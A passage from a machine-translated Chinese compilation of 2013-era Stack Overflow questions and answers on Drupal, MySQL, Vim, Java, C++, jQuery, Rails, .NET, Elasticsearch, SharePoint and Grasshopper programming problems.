所以我的问题是，是否可以说一种内容类型（或建议一种更好的方法），我们可以全局切换布局/样式，然后过滤到所有子节点？或者能够将节点分配给不同的内容类型或任何类似的内容？我确实考虑过在特定内容类型的子主题之间切换，每个子主题都有不同的 .css 样式，但这可能会变得混乱并很快失控。

如果你们可以就我们的构建以及它与你们的比较以及我们如何提高效率提供反馈，那将意味着很多。

伙计们，此时任何帮助或建议将不胜感激。

此致，

乔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-26T17:11:40.913

有（至少）三个模块可以帮助您布置和/或修改页面上的内容。它们是：[Panels](https://drupal.org/project/panels)、[Context](https://drupal.org/project/context)和[Display Suite](https://drupal.org/project/ds)。[这是一个很棒的教程](http://buildamodule.com/)，将引导您了解它们中的每一个，以便您了解它们的使用方式。使用页面左上角的下拉菜单跳转到“高级站点构建”并从那里向下滚动。

# php - 按事件日期对事件进行排序 - 如何？

> ID：15110841
> 
> 赞同：0
> 
> 时间：2013-02-27T11:22:08.670
> 
> 标签：php, date, sorting

我在桌子上存储所有事件。在该表中，我有一个名为“event_date”的列。创建事件的人必须像这样输入日期：d/m/Y - 例如：27/02/2013。

但是当我尝试按 event_date ASC 对结果进行排序时，它并没有按所需的顺序出现。我什至尝试使用 UNIX_TIMESTAMP(event_date) 来订购它，但它也不能解决我的问题。

我怎样才能解决这个问题？

有一个解决方案；当一个人创建一个事件时，我可以将其转换为时间戳。但是就不能像现在这样正确排序吗？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:39:49.867

您必须在 VARCHAR 列中将日期存储为 YYYY/MM/DD 才能使字母数字排序正常工作。
照原样，系统将排序：

```
27/02/2013
01/03/2013
06/03/2013 
```

像这样：

```
01/03/2013
06/03/2013
27/02/2013 
```

如果您可以将列更改为 DATE 数据类型，则可以将输入格式切换为`YYYY-MM-DD`或继续接受`DD/MM/YYYY`并使用：

```
STR_TO_DATE('01/03/2013','%d/%m/%Y') 
```

将值转换为有效日期

# vim - 映射空间键进入插入模式

> ID：15110843
> 
> 赞同：7
> 
> 时间：2013-02-27T11:22:12.037
> 
> 标签：vim

我正在尝试映射我的空格键以使 Vim 从正常模式进入插入模式。

我想这样做的原因是因为有时我忘记了我处于正常模式并开始输入，就好像我处于插入模式一样。当我在页面之间或什至在页面的开头按下空格键时，由于按下的可能性`a`或`i`我刚刚键入的内容，它会向下移动以及某些或其他类型。

所以为了避免这种情况，我想在我们按下时将我的空格键从正常模式映射到插入模式`i`。

我尝试了以下方法：

```
map space :i
map <space> :i 
```

但这些似乎不起作用。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-02-27T11:36:44.433

您正在混淆映射中的模式；这是 Vim 中的一个重要概念。尽管`:startinsert`Vim 中有一个 Ex 命令（您的映射确实以 a 开头），但使用*普通模式*命令`:`更直接： *`i`*

 *```
:nnoremap <Space> i 
```

你只需要一个*普通模式*映射，所以`:nmap`，不是`:map`; cp。`:help map-modes`. 看看`:help key-notation`为什么写它`<Space>`。

最后：[您应该始终使用`:noremap`](http://learnvimscriptthehardway.stevelosh.com/chapters/05.html); 它使映射不受重新映射和递归的影响。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-02-27T11:26:03.557

奇怪的要求，但是，你有你的理由。:)

试试这条线：

```
nnoremap <space> i 
```*

# java - 断言 2 个具有相同对象的列表

> ID：15110847
> 
> 赞同：-1
> 
> 时间：2013-02-27T11:22:23.540
> 
> 标签：java, unit-testing, junit

我有Java测试项目。我有两个不同的列表和一些对象。我如何断言该列表包含相同的对象（不仅等于）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:34:19.467

```
private boolean assertSameObjects(List<?> list1, List<?> list2) {
    assertEquals(list1.size(), list2.size());
    for (int i = 0; i < list1.size(); i++) {
        assertSame(list1.get(i), list2.get(i));
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:39:27.163

你可以这样做：

*   迭代列表（迭代一个在另一个列表中）。
*   比较条目使用`==`，因为您想比较参考。
*   `false`如果在内部列表中未找到外部列表中的条目，则返回。
*   如果外部列表的迭代完成则返回`true`（外部列表中的所有对象引用也存在于内部列表中）

# java - Java：如何从重定向的 URL 中读取内容？

> ID：15110851
> 
> 赞同：6
> 
> 时间：2013-02-27T11:22:27.173
> 
> 标签：java

我在 Bean 中使用以下 Java 代码来读取 URL 的内容：

```
String url;
String inputLine;
StringBuilder srcCode=new StringBuilder();

public void setUrl (String value) {
    url = value; 
}

private void scanWebPage() throws IOException {
    try {
         URL dest = new URL(url);
         URLConnection yc =  dest.openConnection();
         yc.setUseCaches(false);
         BufferedReader in = new BufferedReader(new 
                        InputStreamReader(yc.getInputStream()));
         while ((inputLine = in.readLine()) != null)
            srcCode = srcCode.append (inputLine);
         in.close();
    } catch (FileNotFoundException fne) {
         srcCode.append("File Not Found") ;
    }
} 
```

该代码适用于大多数 URL，但不适用于重定向的 URL。如何更新上述代码以从重定向的 URL 中读取内容？对于重定向的 URL，我得到`"File Not Found"`.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T11:39:49.923

试一试：

```
 HttpURLConnection yc =  (HttpURLConnection) dest.openConnection();
    yc.setInstanceFollowRedirects( true ); 
```

在您上面的代码的上下文中：

```
 `String url = "http://java.sun.com";
    String inputLine;
    StringBuilder srcCode=new StringBuilder();

    URL dest = new URL(url);
    HttpURLConnection yc =  (HttpURLConnection) dest.openConnection();
    yc.setInstanceFollowRedirects( true );
    yc.setUseCaches(false);

    BufferedReader in = new BufferedReader(
        new InputStreamReader(
            yc.getInputStream()));
    while ((inputLine = in.readLine()) != null) {
        srcCode = srcCode.append (inputLine);
    }

    in.close();` 
```

进一步修改以帮助您诊断正在发生的事情。此代码关闭自动重定向，然后手动跟随位置标头打印出来。

```
@Test
public void f() throws IOException {
    String url = "http://java.sun.com";

    fetchURL(url);
}

private HttpURLConnection fetchURL( String url ) throws IOException {
    URL dest = new URL(url);
    HttpURLConnection yc =  (HttpURLConnection) dest.openConnection();
    yc.setInstanceFollowRedirects( false );
    yc.setUseCaches(false);

    System.out.println( "url = " + url );

    int responseCode = yc.getResponseCode();
    if ( responseCode >= 300 && responseCode < 400 ) { // brute force check, far too wide
        return fetchURL( yc.getHeaderField( "Location") );
    }

    System.out.println( "yc.getResponseCode() = " + yc.getResponseCode() );

    return yc;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T12:09:49.990

它不是你的 prog 的调试，但你可以考虑这个

```
public class GetURLData
{
    public static void main(String args[])
    {
        String url = "the url you want the response from";
        HttpClient httpClient = new DefaultHttpClient();
            HttpPost httpPost = new HttpPost(url);
            HttpResponse response;
            StringBuilder builder= new StringBuilder();
            try 
            {
                response = httpClient.execute(httpPost);
                BufferedReader in = new BufferedReader(new InputStreamReader(response.getEntity().getContent(), "UTF-8"));
                char[] buf = new char[8000];
                int l = 0;
                    while (l >= 0) 
                    {
                        builder.append(buf, 0, l);
                        l = in.read(buf);
                    }
                System.out.println(builder.toString);
            } catch (Exception e) 
        {
                System.out.println("Exception is :"+e);
                e.printStackTrace();
            }
    }
} 
```

# c++ - 在多线程 C++ 中捕获进程的输出

> ID：15110853
> 
> 赞同：0
> 
> 时间：2013-02-27T11:22:36.170
> 
> 标签：c++, linux, posix, capture

我的要求很简单：启动一个进程，等待它完成，然后捕获并处理它的输出。

最长的时间我一直在使用以下内容：

```
struct line : public std∷string {
    friend std∷istream& operator>> (std∷istream &is, line &l) {
        return std∷getline(is, l);
    }
};

void capture(std::vector<std::string> &output, const char *command)
{
    output.clear();
    FILE *f = popen(command, "r");
    if(f) {
        __gnu_cxx::stdio_filebuf<char> fb(f, ios∷in) ;
        std::istream fs(&fb);
        std::istream_iterator<line> start(fs), end;
        output.insert(output.end(), start, end);
        pclose(f);
    }
} 
```

它在单线程程序上运行得非常好。

但是，如果我从线程内部调用此函数，有时`popen()`调用会挂起并且永远不会返回。

因此，作为概念验证，我替换了这个丑陋黑客的功能：

```
void capture(std::vector<std::string> &output, const char *command)
{
    output.clear();
    std::string c = std::string(command) + " > /tmp/out.txt";
    ::system(c.c_str());
    ifstream fs("/tmp/out.txt", std::ios::in);
    output.insert(output.end(), istream_iterator<line>(fs), istream_iterator<line>());
    unlink("/tmp/out.txt");
} 
```

它很丑但有效，但是它让我想知道在多线程程序上捕获进程输出的*正确方法是什么。*

该程序在嵌入式 powerquiccII 处理器中运行在 linux 上。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T11:26:32.160

看到这个：[popen - 锁或不是线程安全的？](https://stackoverflow.com/questions/1702442/popen-locks-or-not-thread-safe)和其他参考似乎并不能确定 popen() 需要是线程安全的，所以也许因为您使用的是不太受欢迎的平台，所以您的实现不是。您有机会查看您平台的实现源代码吗？

否则，请考虑创建一个新进程并等待它。或者，嘿，坚持愚蠢的 system() hack，但要处理它的返回码！

# javascript - 试图让一个 div 进入查看

> ID：15110854
> 
> 赞同：4
> 
> 时间：2013-02-27T11:22:39.640
> 
> 标签：javascript, jquery

我试图让一个 div 进入视图，并且 div 元素正在动态添加.. 所以我分配了一个链接，单击该链接可以将 div 元素带入视图，无论它是否已经在视图中。所以当我点击链接时，如果我试图进入视图的 div 已经在视图中，它将远离我的视图。这是一个错误？

[http://jsfiddle.net/xFu3M/6/](http://jsfiddle.net/xFu3M/6/)

我添加了一个工作示例。

代码就像

```
$(".testClick").on("click",function(e){
    e.preventDefault(); 
      // Call the scroll function
    goToByScroll("indID"+1);
});

function goToByScroll(id){
      // Reove "link" from the ID
    id = id.replace("link", "");
      // Scroll
    $('.contentBody').animate({
        scrollTop: $("#"+id).offset().top},
        'slow');
 } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:42:17.097

考虑到父偏移量也会很有用：

`**[LIVE DEMO](http://jsfiddle.net/xFu3M/11/)**`

```
$(document).ready(function(){
    $(".wrapper").css({"width" : $(window).width() , "height" :  $(window).height()} );  
    $(".testClick").on("click",function(e){      
        e.preventDefault(); 
        goToByScroll("indID1"); // try change to indID4
    });       
});

function goToByScroll(id){
    var el = $('#'+id);
    var elOffs = el.offset().top;
    var parOffs = el.closest('.contentBody').offset().top;
    $('.contentBody').stop().animate({ scrollTop: elOffs - parOffs },800);
} 
```

# ruby-on-rails - Rails 控制台中手动更新属性值的验证问题

> ID：15110858
> 
> 赞同：44
> 
> 时间：2013-02-27T11:22:48.437
> 
> 标签：ruby-on-rails

我有一个简单的问题。我想为我`User.find(1)`的 in rails 控制台更改一些字段值。

我试过：

```
u = User.find(1)
u.update_attributes(roles_mask: 3) 
```

并被`false`退回。当我检查时`u.errors.full_messages`，我发现这是因为来自 的密码验证存在问题`has_secure_password`。如何在控制台中手动更新它？

* * *

## 回答 #1

> 赞同：72
> 
> 时间：2013-02-27T11:26:34.857

如果要绕过验证，请使用

```
# skip validations but run callbacks
u.update_attribute :roles_mask, 3 
```

或者

```
# do the update on the sql so no validation and callback is executed
u.update_column :roles_mask, 3 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-02-27T11:26:42.237

您必须先对用户进行身份验证，然后才能更新用户，看看[这里](http://api.rubyonrails.org/classes/ActiveModel/SecurePassword/ClassMethods.html#method-i-has_secure_password)

```
u = User.find(1)
u.authenticate("password")
u.update_attributes(roles_mask: 3) 
```

或者，如果您想跳过验证，您可以执行以下操作；

```
u = User.find(1)
u.update_attribute :roles_mask, 3 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-02-27T11:26:50.430

你可以试试`update_attribute(:roles_mask, 3)`或`update_column(:roles_mask, 3)`。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2016-05-25T08:32:29.623

你可以有这样的东西

```
Post.find(1).comments.first.update(body: "hello") 
```

或者

```
@u = Post.find(1)
@u.comments.first.update(body: "hello") 
```

其中comments 是comment 表的名称，body 是comment 表中列的名称。

这适用于嵌套属性

post.rb

```
has_many: comments
accept_nested_attributes_for: comment 
```

comment.rb

```
belongs_to: post 
```

# c# - NET 4.0 SpinWait 方法与 4.0 之前的 SpinWait() 方法有何不同？

> ID：15110860
> 
> 赞同：3
> 
> 时间：2013-02-27T11:22:55.643
> 
> 标签：c#, .net, multithreading, concurrency, spinwait

MSDN [“线程安全集合 .NET Framework 4”](http://msdn.microsoft.com/en-us/library/dd997305%28v=vs.100%29.aspx)指出：

> “一些并发集合类型使用轻量级同步机制，例如[SpinLock](http://msdn.microsoft.com/en-us/library/system.threading.spinlock%28v=vs.100%29.aspx)、**SpinWait**、 [SemaphoreSlim](http://msdn.microsoft.com/en-us/library/system.threading.semaphoreslim%28v=vs.100%29.aspx)和[CountdownEvent](http://msdn.microsoft.com/en-us/library/system.threading.countdownevent%28v=vs.100%29.aspx)，它们是 .NET Framework 4 中的新功能”

而 MSDN 网站告诉[SpinWaitwas 在 .NET 1.1 中可用，](http://msdn.microsoft.com/en-us/library/system.threading.thread.spinwait%28v=vs.71%29.aspx)而另一篇 MSDN 文章[从 .NET 4.0 开始 SpinWaitwas](http://msdn.microsoft.com/en-us/library/system.threading.spinwait%28v=vs.100%29.aspx)

好吧，好奇来自 Lee Grissom 的评论，回答[SynchronizedCollection 和其他并发集合有什么区别？](https://stackoverflow.com/a/4655236/200449)：

> “@Matt，.NET4 并发类使用`SpinWait`对象来解决线程安全问题，而不是 Monitor.Enter/Exit（又名关键部分）？”

以及第一个 NSDN 引用说明这`SpinWait`是 .NET 4.0 的新内容

那么，它是不是新的？
如果是新的，那怎么办？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-27T11:25:32.823

该**结构** 被引入 .NET 4。该**方法**自 .NET 1.0 以来一直存在。[`System.Threading.SpinWait`](http://msdn.microsoft.com/en-us/library/system.threading.spinwait.aspx) **`System.Threading.Thread.SpinWait`**

 ****从`SpinWait`结构的文档中：

> SpinWait 通常不适用于普通应用程序。在大多数情况下，您应该使用 .NET Framework 提供的同步类，例如 Monitor。然而，对于大多数需要旋转等待的目的，`SpinWait`类型应该优先于`SpinWait`方法。

请注意在大多数情况下您不应该使用它们中的任何一个的部分:)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-27T11:25:56.303

该结构`System.Threading.SpinWait`是 .NET 4.0 的新结构。该方法`System.Threading.Thread.SpinWait()`从 .NET 1.0 开始存在。

请注意，`System.Threading.SpinWait`内部调用`System.Threading.Thread.SpinWait()`. 有关详细信息，请参阅 Joe Duffy 的“Windows 上的并发编程”（第 14 章，“Spin Waiting”部分）。****

# elasticsearch - 弹性搜索查询词和评分

> ID：15110863
> 
> 赞同：7
> 
> 时间：2013-02-27T11:23:03.597
> 
> 标签：elasticsearch, tire

我有一个使用如下术语的请求：

```
{
"query": {
  "bool": {
    "should": [
      {
        "terms": {
          "subjects.id": [
            1,
            2,
            3
          ], boost: 3
        }
      },
      {
        "terms": {
          "qualification_type.id": [
            3,
            5
          ], boost: 2
        }
      }
    ]
  }
} 
```

我工作得很好，但与仅匹配一个主题的文档相比，匹配三个主题的文档得分更高。

我的问题是：如果科目有一个或多个匹配，有没有办法强制分数相同？

提前致谢 ！

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-02-27T12:31:27.383

您可以将术语查询转换为过滤器并将它们包装成[常数分数查询](https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-constant-score-query.html)。例如：

```
{
    "query": {
        "bool": {
            "should": [{
                "constant_score": {
                    "filter": {
                        "terms": {
                            "subjects.id": [1, 2, 3]
                        }
                    },
                    boost: 3
                }
            }, {
                "constant_score": {
                    "filter": {
                        "terms": {
                            "qualification_type.id": [3, 5]
                        }
                    },
                    boost: 2
                }
            }]
        }
    }
} 
```

# jquery - 通过 inkskape:label 属性选择 SVG 元素

> ID：15110866
> 
> 赞同：2
> 
> 时间：2013-02-27T11:23:12.747
> 
> 标签：jquery, svg, attributes, label

我有一个加载了 SVG Jquery 插件[http://keith-wood.name/svg.html](http://keith-wood.name/svg.html)的外部 SVG 。SVG 的一行是：
`<g groupmode="layer" id="layer1" inkscape:label="myLabel"></g>`
我可以通过这一行获取该元素的标签值，
`$('#layer1', svg.root()).attr("inkscape:label");`
这将返回值“myLabel”。
如何使用该值选择相同的元素？
尝试
`var myElement = $('g[inkscape:label="myLabel"]', svg.root());`
没有运气。

有什么建议吗？
蒂亚！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T19:59:21.867

根据[this SO post](https://stackoverflow.com/questions/2047466/jquery-selecting-a-selector-with-namespaced-element)引用[jquery docs](http://api.jquery.com/category/selectors/?rdfrom=http%3A%2F%2Fdocs.jquery.com%2Fmw%2Findex.php%3Ftitle%3DSelectors%26redirect%3Dno#Special_characters_in_selectors)，你最好的选择是`var myElement = $('g[inkscape\\:label="myLabel"]', svg.root());`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-11-26T15:24:02.443

对我来说，唯一有效的解决方案是[这个](https://stackoverflow.com/a/59381801/2132157)：

```
const t = document.querySelectorAll('g') 
const layer = Array.from(t)
    .filter(t => t.getAttribute('inkscape:label') === 'myLabel')[0] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-06-28T22:24:54.150

我不可能按照你的要求让它工作。我得到的解决方案是复制标签，但使用下划线而不是两个点，如下所示：

```
$('path').each(function() {
    $(this).attr({
        "inkscape_label" : $(this).attr('inkscape:label')
    });
}); 
```

然后我可以像这样选择我想要的标签：

```
$('[inkscape_label = ... 
```

# visual-studio - 如何修改 Visual Studio Web 性能测试中的预期状态代码

> ID：15110870
> 
> 赞同：2
> 
> 时间：2013-02-27T11:23:20.290
> 
> 标签：visual-studio, unit-testing, visual-studio-2012, web-testing

您如何*（甚至可以）*在 Visual Studio Web 性能测试中修改预期的 HTTP 状态代码？

我正在检查客户站点的一些新位，因此使用一些 Visual Studio Web 性能测试来驱动页面。

运行测试并在服务器上发生预期的操作......**但**测试失败

原因是缺少一些 GIF 文件的隐藏链接，这些链接返回 404 状态

我无法让客户端添加文件，但我不想每次都检查各种测试以检查**“失败”**是预期的 404 之一还是真正的失败

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-01T15:38:57.880

您可以编写一个删除依赖请求的 Web 测试插件，而不是期待不同的状态代码。基本上，插件会扫描相关请求，并删除任何符合某些条件的请求。我已经在一些性能测试项目中做到了这一点，以避免因为我知道每次测试都会失败的事情而导致测试失败。当然，您的测试报告应该描述丢失的文件。另请参见[http://blogs.msdn.com/b/edglas/archive/2008/07/17/dependent-request-filter.aspx](http://blogs.msdn.com/b/edglas/archive/2008/07/17/dependent-request-filter.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-01T13:14:23.727

在请求的属性中，您可以将“预期的 HTTP 状态代码”更改为预期的 (Int32) Http 状态代码。

# mysql - 如何在mysql数据库中生成序列号？

> ID：15110871
> 
> 赞同：1
> 
> 时间：2013-02-27T11:23:24.753
> 
> 标签：mysql, database, database-design

我有这样的表：

表格1：

`sr no. | id | name`

id 是这里的主键。我想要`sr no.`循环。
我应该赋予`sr no.`字段什么属性？

例如，我有 5 条记录，分别为`sr no`1,2,3,4,5 和`id`1,2,3,4,5，我删除第三条记录然后`id`将是 1,2,4,5 和`sr no.`1,2,3， 4 `sr no`不应该失去它的争议性。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T12:05:19.053

```
SELECT  @a:=@a+1 serial_number, 
        name  FROM    table1,
        (SELECT @a:= 0) AS a; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:32:00.060

`id`已经是你的主键了，你还需要`sr no.`什么？建议忘记它。

如果您**真的需要它，请**[在此处](https://stackoverflow.com/questions/13643938/mysql-delete-autoincrement/13644089#13644089)查看我的答案，原因有几个原因，为什么这是一个非常糟糕的主意。最重要的原因：

> 当您删除一行时，MySQL 不会自动减小自动增量值是有原因的。这些原因是
> 
> *   破坏数据完整性的危险（想象多个用户执行删除或插入......可能会出现双重条目或更糟）
> *   使用主从复制或事务时可能会出现错误
> *   等等 ...

无需担心间隙。

要回答您的问题，只需添加`auto_increment`列定义并将其包含在主键中即可。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-27T11:35:49.143

我不知道 sr no 的真正目的。

但是您可以为该表创建**DELETE**`Trigger`操作，现在您可以更新大于当前 ID 的记录，以便 sr no 减 1。

 **例如，您可以在触发器中编写以下 SQL，

```
UPDATE table1 SET sr_no = sr_no -1 WHERE id > XYZ; 
```**

# c# - 在 WPF C# 中绘制数百万个点

> ID：15110874
> 
> 赞同：0
> 
> 时间：2013-02-27T11:23:30.057
> 
> 标签：c#, wpf, cloud, point

我需要在 WPF 窗口上可视化由数百万个 3D 点组成的点云。

因为它会有很多点，所以性能很重要，但我不需要绘制任何高级图元，例如三角形、四边形或位图。

经过调查，我想出了一些关键字，如 D3D、D3DRS_POINTSIZE 和 D3DImage 互操作与原生代码和托管代码的组合，但对于我的简单目标来说这听起来有点矫枉过正，我不确定这是否正确.

提前致谢！

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-02-27T12:08:05.603

我不想听起来粗鲁，但你为什么不试试呢？您可以使用正确的库在 winforms 中完成相同的工作，WPF 也有很棒的图形库，但它们都依赖于 .net 框架。

未管理的代码可能会更有效，因为您将只处理必要的低级库，但如果您对 C++ 不太方便，请尝试使用 .net

# jquery - jQuery 模式对话框不在 SharePoint 2007 中居中

> ID：15110875
> 
> 赞同：0
> 
> 时间：2013-02-27T11:23:30.787
> 
> 标签：jquery, jquery-ui, sharepoint-2007, modal-dialog, jquery-ui-dialog

在列表的 AllItems 页面上，我在显示列表的 Web 部件上方添加了一个内容编辑器 WebPart。此 Web 部件仅包含一个 HTML 按钮。当用户单击按钮时，列表中的所有项目将由几个 JavaScript/jQuery/AJAX 函数处理。但是该列表包含 1000 多个项目，不让他们知道代码正在处理这些项目是不友好的。

首先，出于开发目的，我在方法之间使用警报来显示某种交互性并为用户提供信息。但现在我正在使用 jQuery 模态对话框以一种很好的方式向用户展示代码正在处理项目。

对话框已显示，但不在屏幕中央，标题栏未显示在对话框的整个宽度上，透明灰色覆盖层不可见。我在一个空的 ASP.NET Web 应用程序中测试了完全相同的代码，在这种情况下一切正常。

我正在使用 jQuery 1.8.2 和 jQuery UI 1.10.1。无论如何，这就是我所拥有的：

```
function showProcessDialog() {
    showDialog("Please wait while processing all items...", null);
}

function showDialog(message, dialogButtons) {
    $("#messageContainer").text(message);
    $('#dialog-message').parent().appendTo($('form:first'));
    $("#dialog-message").dialog({
        draggable: false,
        height: "auto",
        modal: true,
        open: function (event, ui) { $(".ui-dialog-titlebar-close").hide(); },
        position: { my: "center", at: "center", of: window },
        resizable: false,
        width: 400,
        buttons: dialogButtons
    });
} 
```

注意这一行：

```
$('#dialog-message').parent().appendTo($('form:first')); 
```

我读到，当在 SharePoint 2007 中加载页面时，jQuery 会操纵 DOM，并且将充当对话框的 div 元素放置在正文的外部。最大的问题是对话框中的服务器端控件将不再起作用，并且此行将 div 放回表单中。我把它留在那里是因为你永远不知道...

这是 ASP.NET Web 应用程序中的结果：

![在 ASP.NET Web 应用程序中工作](../Images/62832701d34c800ecbe5b00d99c35d81.png)

这是 SharePoint 2007 中的相同代码：

![在 SharePoint 2007 中不工作](../Images/0f67c27ebbcad12a64b9056a72fb8a33.png)

有谁知道我该如何解决这个问题，以便结果与工作结果相同？提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:44:39.097

我在这里创建了一个非常简化的版本，您可以进行测试。从样式上看，某些 jquery-ui 项目没有正确加载，您是否查看了 chrome 的调试器 /firebug 的“网络”部分以查看是否有任何项目未加载？

```
function showDialog(message, dialogButtons) {
   var dialog1 = $('<div id="main_content" class="ui-widget" title="Documents"></div>');
   $(dialog1).html(message);
   $(dialog1).dialog({ width: 200, height: 200, position: "center" ,modal:true});
} 
```

您是否尝试过手动更改 Dialog DOM 元素以将其与 css 居中，如下所示：

```
.center
{
    margin-left:auto;
    margin-right:auto;
    width:70%;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T03:34:21.403

我在尝试升级到最新版本的 jQuery 和 jQuery UI 的应用程序中遇到了完全相同的问题。我正在运行 IE 8（在 7 模式下）。

我可以告诉你，在我升级之前工作的是 jQuery 1.6.2 和 jQuery UI 1.8.16。最终，我切换回这些版本，因为无论如何客户端很快就会升级到 SP 2010，而且解决它不值得麻烦。

```
 $('#search-modal').dialog({ autoOpen: false, bgiframe: true, modal: true, width: 400, height: 550, resizable: false });
    $('#search-modal').dialog('open');
    $('#search-modal').parent().appendTo($("form:first")); 
```

祝你好运！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-19T11:22:29.120

问题在于 IE 文档模式。默认情况下，SP2007 页面以[兼容模式](http://www.siolon.com/blog/ie-8-compatibility-mode-and-sharepoint/)呈现，因为如上面评论中所述，IE 进入了怪癖模式。这就是它不同于 ASP 解决方案的原因。
如果您切换到 IE7+ 文档模式 - jQuery 可以工作，但您可能会遇到一些与渲染共享点页面相关的新问题。

我更喜欢在这种情况下使用[自定义 js](http://jsfiddle.net/46jYC/3/)，因为它更灵活。要使 div 居中，您应该将显示按钮的 onclick 行为更改为以下内容：

```
pos = get_scroll(); 
$("#dialog").css({ 
    'top': pos.y,
    'left': pos.x + window.screen.availWidth / 2,
    'margin-left': 50}
).show(); 
```

如您所见，您在这里也已经有关闭按钮问题，如果内容 div 变得大于对话框 div，稍后会遇到溢出问题。

# python - 将python中的数组列表转换为蚱蜢中的树

> ID：15110889
> 
> 赞同：2
> 
> 时间：2013-02-27T11:23:59.733
> 
> 标签：python, arrays, tree, grasshopper, rhino3d

我是 Python 的初学者，有一个关于转换数据结构的问题，以便在 Grasshopper 中使用它。

作为我的 python 代码的输出，我有一个立方体网格（GUID），按我所说的“世代”分层。除此之外，它还输出一个数据网格，其中包含有关每个立方体应该获得什么颜色的信息。

例如：对于 i=3 中的 j=5，在 generation=5 中，我有一个立方体。在另一个列表中，对于 i=3 中的 j=5 ，在 generation=5 中，我将 'green' 作为字符串。在蚱蜢中，我想将这个“绿色”值链接到一个样本，然后用它为正确的立方体着色。

问题是 Python 输出一个 3 维数组，而 Grasshopper 在树中工作。所以，我必须将我的输出转换为一个树结构，其中第一级是“世代”，第二级是“i”，第三级是“j”。

一个朋友给我发了这段代码，所以我想这是如何开始的：

从 Grasshopper.Kernel.Data 导入 clr clr.AddReference("Grasshopper") 从 Grasshopper 导入 GH_Path 导入 DataTree

我希望你们能帮忙！泰莎

这是我的主要功能：

```
def Main():
    intLength = input1
    intWidth  = input2
    intGen    = input3
arrValues = randomizeArray01(intLength,intWidth)        
arrDensity = densityfunction(arrValues)
arrMeshes = render(arrValues,-1)                        
for k in range(intGen):
    arrValues = applyGOL(arrValues,arrDensity)          
    arrDensity = densityfunction(arrValues)
    genC = colorObject(arrValues)
    colorList.append(genC)
    genR = render(arrValues,k)   
    renderList.append(genR) 
```

这是渲染函数：

```
def render(arrValues, z):
    rs.EnableRedraw(False)
    arrMeshes = []
    for i in range(len(arrValues)):
        arrRow = []
        for j in range(len(arrValues[i])):
            box = addMeshBox([(i-0.5),(len(arrValues[i])-j-0.5),z-0.5], [(i+0.5),(len(arrValues[i])-j+0.5),z+0.5])
            arrRow.append(box)
        arrMeshes.append(arrRow)
    rs.EnableRedraw(True)                               
    return arrMeshes 
```

这是颜色函数：

```
def colorObject(arrValues):
    arrColor = []
    for i in range(len(arrValues)):
        rowColor= []
        for j in range(len(arrValues[i])):
            if arrValues[i][j] == 0:
                color = green
                rowColor.append(color)
            elif arrValues[i][j] ==1:
                color = residential
                rowColor.append(color)
            elif arrValues[i][j] ==100:
                color = retail
                rowColor.append(color)
            elif arrValues[i][j] ==1000:
                color = road
                rowColor.append(color)
        arrColor.append(rowColor)
    return arrColor 
```

最后，这就是我向 Grasshopper 输出的内容：

```
a = renderList
b = colorList 
```

在蚱蜢中，这给了我一个“Iron.Python.Runtime.List”列表。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-04T02:39:11.537

我手头没有工作版本的蚂蚱，但我这样做的代码是：

```
import rhinoscriptsyntax as rs

import Rhino.Geometry as rg
from clr import AddReference as addr
addr("Grasshopper")

from System import Object
from Grasshopper import DataTree
from Grasshopper.Kernel.Data import GH_Path

def raggedListToDataTree(raggedList):
    rl = raggedList
    result = DataTree[object]()
    for i in range(len(rl)):
        temp = []
        for j in range(len(rl[i])):
            temp.append(rl[i][j])
        #print i, " - ",temp
        path = GH_Path(i)
        result.AddRange(temp, path)
    return result 
```

这里有一个要点[，](https://gist.github.com/notionparallax/5433271)它还具有将树转换为列表的功能。

这仍然有很多错误，没有递归，没有错误检查，没有分支魔法，但它在大多数情况下都能完成工作。我很想看到它有所改善！

在您的情况下，您可以将输出通过管道传输，否则会为您提供运行时列表到`raggedListToDataTree`函数中。

# jquery-ui - Jquery自动完成在IE8中不起作用

> ID：15110892
> 
> 赞同：1
> 
> 时间：2013-02-27T11:24:08.977
> 
> 标签：jquery-ui, autocomplete

我使用了来自[http://jqueryui.com/autocomplete/#default](http://jqueryui.com/autocomplete/#default)的代码，该代码在 FF 和 Chrome 中运行良好，但**不适用于 IE8 版本 8.0.7600.16385**。开发者控制台状态

> 'null' 为 null 或不是对象

怎么了？

```
<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="WebForm1.aspx.cs" Inherits="Web.XXX.XXX.WebForm1" %>

<!DOCTYPE html>    

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
<meta charset="utf-8" />
<title>jQuery UI Autocomplete - Default functionality</title>
